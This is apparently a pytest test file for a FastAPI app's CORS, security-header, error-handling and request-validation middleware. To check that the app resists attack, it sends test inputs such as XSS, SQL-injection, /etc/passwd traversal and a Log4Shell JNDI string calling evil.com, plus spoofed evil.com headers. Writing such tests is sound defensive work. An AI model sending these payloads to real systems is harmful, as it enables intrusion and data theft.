import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from fastapi import FastAPI, Request, Response, HTTPException
from fastapi.testclient import TestClient
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import JSONResponse
import time
import json

from app.main import app
from app.core.config import settings


class TestCORSMiddleware:
    """Testes críticos para middleware CORS"""

    def setup_method(self):
        """Setup para cada teste"""
        self.client = TestClient(app)

    def test_cors_preflight_request(self):
        """Teste: requisição preflight CORS"""
        response = self.client.options(
            "/api/v1/auth/token",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type,Authorization",
            },
        )

        assert response.status_code == 200
        assert "Access-Control-Allow-Origin" in response.headers
        assert "Access-Control-Allow-Methods" in response.headers
        assert "Access-Control-Allow-Headers" in response.headers

    def test_cors_allowed_origins(self):
        """Teste: origens permitidas pelo CORS"""
        allowed_origins = [
            "http://localhost:3000",
            "http://localhost:5173",
            "https://autonomocontrol.com",
        ]

        for origin in allowed_origins:
            response = self.client.get("/api/v1/health", headers={"Origin": origin})

            # Deve permitir a origem
            assert "Access-Control-Allow-Origin" in response.headers

    def test_cors_blocked_origins(self):
        """Teste: origens bloqueadas pelo CORS"""
        blocked_origins = [
            "http://evil.com",
            "https://malicious-site.com",
            "http://localhost:8080",  # Porta não permitida
            "ftp://localhost:3000",  # Protocolo não permitido
        ]

        for origin in blocked_origins:
            response = self.client.get("/api/v1/health", headers={"Origin": origin})

            # Não deve incluir Access-Control-Allow-Origin para origens não permitidas
            if "Access-Control-Allow-Origin" in response.headers:
                assert response.headers["Access-Control-Allow-Origin"] != origin

    def test_cors_credentials_handling(self):
        """Teste: tratamento de credenciais CORS"""
        response = self.client.get(
            "/api/v1/health", headers={"Origin": "http://localhost:3000"}
        )

        # Deve permitir credenciais
        assert response.headers.get("Access-Control-Allow-Credentials") == "true"

    def test_cors_headers_security(self):
        """Teste: segurança dos headers CORS"""
        response = self.client.options(
            "/api/v1/auth/token",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type,Authorization,X-Malicious-Header",
            },
        )

        allowed_headers = response.headers.get("Access-Control-Allow-Headers", "")

        # Não deve permitir headers maliciosos
        assert "X-Malicious-Header" not in allowed_headers
        # Deve permitir headers necessários
        assert "Content-Type" in allowed_headers
        assert "Authorization" in allowed_headers

    def test_cors_methods_restriction(self):
        """Teste: restrição de métodos CORS"""
        dangerous_methods = ["TRACE", "CONNECT", "PATCH"]

        for method in dangerous_methods:
            response = self.client.options(
                "/api/v1/auth/token",
                headers={
                    "Origin": "http://localhost:3000",
                    "Access-Control-Request-Method": method,
                },
            )

            allowed_methods = response.headers.get("Access-Control-Allow-Methods", "")

            # Métodos perigosos não devem ser permitidos
            if method in ["TRACE", "CONNECT"]:
                assert method not in allowed_methods


class TestSecurityHeaders:
    """Testes para headers de segurança"""

    def setup_method(self):
        """Setup para cada teste"""
        self.client = TestClient(app)

    def test_security_headers_present(self):
        """Teste: presença de headers de segurança"""
        response = self.client.get("/api/v1/health")

        # Headers de segurança essenciais
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        for header, expected_value in security_headers.items():
            if header in response.headers:
                # Se presente, deve ter valor seguro
                assert expected_value in response.headers[header] or response.headers[
                    header
                ] in ["DENY", "SAMEORIGIN", "nosniff"]

    def test_sensitive_headers_not_exposed(self):
        """Teste: headers sensíveis não expostos"""
        response = self.client.get("/api/v1/health")

        # Headers que não devem estar presentes
        sensitive_headers = [
            "Server",
            "X-Powered-By",
            "X-AspNet-Version",
            "X-AspNetMvc-Version",
            "X-Runtime",
        ]

        for header in sensitive_headers:
            assert header not in response.headers, f"Header sensível exposto: {header}"

    def test_content_type_security(self):
        """Teste: segurança do Content-Type"""
        response = self.client.get("/api/v1/health")

        content_type = response.headers.get("Content-Type", "")

        # Deve especificar charset para prevenir ataques
        if "text/" in content_type or "application/json" in content_type:
            assert "charset" in content_type.lower()


class TestErrorHandlingMiddleware:
    """Testes críticos para tratamento de erros"""

    def setup_method(self):
        """Setup para cada teste"""
        self.client = TestClient(app)

    def test_error_response_format(self):
        """Teste: formato padronizado de resposta de erro"""
        # Tentar acessar endpoint inexistente
        response = self.client.get("/api/v1/nonexistent")

        assert response.status_code == 404

        # Resposta deve ser JSON
        assert response.headers.get("Content-Type") == "application/json"

        # Deve ter estrutura padronizada
        error_data = response.json()
        assert "detail" in error_data or "message" in error_data

    def test_error_information_disclosure(self):
        """Teste: não exposição de informações sensíveis em erros"""
        # Simular erro interno
        response = self.client.post(
            "/api/v1/auth/token", data={"username": "invalid", "password": "invalid"}
        )

        error_data = response.json()
        error_message = str(error_data)

        # Não deve expor informações sensíveis
        sensitive_info = [
            "database",
            "connection",
            "password",
            "secret",
            "key",
            "token",
            "traceback",
            "stack trace",
            "file path",
            "/app/",
            "sqlalchemy",
            "psycopg2",
        ]

        for info in sensitive_info:
            assert (
                info.lower() not in error_message.lower()
            ), f"Informação sensível exposta: {info}"

    def test_error_rate_limiting(self):
        """Teste: limitação de taxa para erros"""
        # Fazer múltiplas requisições inválidas rapidamente
        error_responses = []

        for _ in range(10):
            response = self.client.post(
                "/api/v1/auth/token",
                data={"username": "invalid", "password": "invalid"},
            )
            error_responses.append(response.status_code)

        # Deve haver alguma forma de limitação após muitos erros
        # (implementação específica pode variar)
        assert all(status in [400, 401, 422, 429] for status in error_responses)

    def test_error_logging_security(self):
        """Teste: segurança no logging de erros"""
        with patch("app.core.logging.logger") as mock_logger:
            # Simular erro com dados sensíveis
            response = self.client.post(
                "/api/v1/auth/token",
                data={
                    "username": "user@example.com",
                    "password": "sensitive_password_123",
                },
            )

            # Verificar se dados sensíveis não foram logados
            if mock_logger.error.called:
                logged_messages = [
                    call.args[0] for call in mock_logger.error.call_args_list
                ]
                all_logs = " ".join(str(msg) for msg in logged_messages)

                # Senhas não devem aparecer nos logs
                assert "sensitive_password_123" not in all_logs

    def test_exception_handling_edge_cases(self):
        """Teste: tratamento de casos extremos de exceção"""
        # Testar com dados malformados
        malformed_requests = [
            # JSON inválido
            ('{"invalid": json}', "application/json"),
            # Dados muito grandes
            ('{"data": "' + "x" * 100000 + '"}', "application/json"),
            # Caracteres especiais
            ('{"test": "\x00\x01\x02"}', "application/json"),
        ]

        for data, content_type in malformed_requests:
            response = self.client.post(
                "/api/v1/auth/token",
                content=data,
                headers={"Content-Type": content_type},
            )

            # Deve retornar erro apropriado, não crash
            assert response.status_code in [400, 422, 500]

            # Resposta deve ser válida
            try:
                response.json()
            except json.JSONDecodeError:
                pytest.fail("Resposta de erro não é JSON válido")


class TestRequestValidationMiddleware:
    """Testes para middleware de validação de requisições"""

    def setup_method(self):
        """Setup para cada teste"""
        self.client = TestClient(app)

    def test_request_size_limits(self):
        """Teste: limites de tamanho de requisição"""
        # Requisição muito grande
        large_data = {"data": "x" * 1000000}  # 1MB

        response = self.client.post("/api/v1/auth/register", json=large_data)

        # Deve rejeitar requisições muito grandes
        assert response.status_code in [400, 413, 422]

    def test_request_timeout_handling(self):
        """Teste: tratamento de timeout de requisição"""
        # Simular requisição lenta
        with patch("time.sleep") as mock_sleep:
            mock_sleep.side_effect = lambda x: time.sleep(min(x, 0.1))

            response = self.client.get("/api/v1/health")

            # Deve responder dentro do tempo limite
            assert response.status_code == 200

    def test_malicious_headers_filtering(self):
        """Teste: filtragem de headers maliciosos"""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1, evil.com",
            "X-Real-IP": "192.168.1.1",
            "X-Forwarded-Host": "evil.com",
            "Host": "evil.com",
            "X-Forwarded-Proto": "javascript:alert('xss')",
        }

        response = self.client.get("/api/v1/health", headers=malicious_headers)

        # Deve processar a requisição sem executar código malicioso
        assert response.status_code == 200

    def test_content_type_validation(self):
        """Teste: validação de Content-Type"""
        # Tentar enviar dados com Content-Type incorreto
        response = self.client.post(
            "/api/v1/auth/token",
            content="username=test&password=test",
            headers={"Content-Type": "text/plain"},
        )

        # Deve rejeitar Content-Type inadequado
        assert response.status_code in [400, 415, 422]

    def test_user_agent_validation(self):
        """Teste: validação de User-Agent"""
        suspicious_user_agents = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]

        for user_agent in suspicious_user_agents:
            response = self.client.get(
                "/api/v1/health", headers={"User-Agent": user_agent}
            )

            # Deve processar sem executar código malicioso
            assert response.status_code == 200


class TestPerformanceMiddleware:
    """Testes de performance do middleware"""

    def setup_method(self):
        """Setup para cada teste"""
        self.client = TestClient(app)

    def test_response_time_monitoring(self):
        """Teste: monitoramento de tempo de resposta"""
        start_time = time.time()
        response = self.client.get("/api/v1/health")
        end_time = time.time()

        response_time = end_time - start_time

        # Resposta deve ser rápida
        assert response_time < 1.0  # Menos de 1 segundo
        assert response.status_code == 200

    def test_concurrent_request_handling(self):
        """Teste: tratamento de requisições concorrentes"""
        import concurrent.futures

        def make_request():
            return self.client.get("/api/v1/health")

        # Fazer 20 requisições concorrentes
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(20)]
            responses = [
                future.result() for future in concurrent.futures.as_completed(futures)
            ]

        # Todas as requisições devem ser bem-sucedidas
        assert all(r.status_code == 200 for r in responses)

    def test_memory_usage_stability(self):
        """Teste: estabilidade do uso de memória"""
        import gc
        import psutil
        import os

        # Medir uso de memória inicial
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss

        # Fazer muitas requisições
        for _ in range(100):
            response = self.client.get("/api/v1/health")
            assert response.status_code == 200

        # Forçar garbage collection
        gc.collect()

        # Medir uso de memória final
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory

        # Aumento de memória deve ser razoável (menos de 50MB)
        assert memory_increase < 50 * 1024 * 1024

    def test_middleware_order_security(self):
        """Teste: ordem segura dos middlewares"""
        # Verificar se middlewares de segurança são aplicados primeiro
        response = self.client.get("/api/v1/health")

        # Headers de segurança devem estar presentes
        security_headers = ["X-Content-Type-Options", "X-Frame-Options"]

        for header in security_headers:
            if header in response.headers:
                # Se presente, deve ter valor seguro
                assert response.headers[header] in ["nosniff", "DENY", "SAMEORIGIN"]


class TestMiddlewareIntegration:
    """Testes de integração entre middlewares"""

    def setup_method(self):
        """Setup para cada teste"""
        self.client = TestClient(app)

    def test_cors_and_security_headers_interaction(self):
        """Teste: interação entre CORS e headers de segurança"""
        response = self.client.options(
            "/api/v1/auth/token",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
            },
        )

        # Deve ter tanto headers CORS quanto de segurança
        assert "Access-Control-Allow-Origin" in response.headers

        # Headers de segurança não devem interferir com CORS
        if "X-Frame-Options" in response.headers:
            assert response.headers["X-Frame-Options"] in ["DENY", "SAMEORIGIN"]

    def test_error_handling_with_cors(self):
        """Teste: tratamento de erro com CORS"""
        response = self.client.post(
            "/api/v1/auth/token",
            data={"username": "invalid", "password": "invalid"},
            headers={"Origin": "http://localhost:3000"},
        )

        # Erro deve manter headers CORS
        assert response.status_code in [400, 401, 422]
        assert "Access-Control-Allow-Origin" in response.headers

    def test_middleware_exception_propagation(self):
        """Teste: propagação de exceções entre middlewares"""
        # Simular erro que deve passar por todos os middlewares
        response = self.client.get("/api/v1/nonexistent-endpoint")

        # Deve retornar 404 com headers apropriados
        assert response.status_code == 404
        assert response.headers.get("Content-Type") == "application/json"

        # Resposta deve ser JSON válido
        error_data = response.json()
        assert "detail" in error_data or "message" in error_data
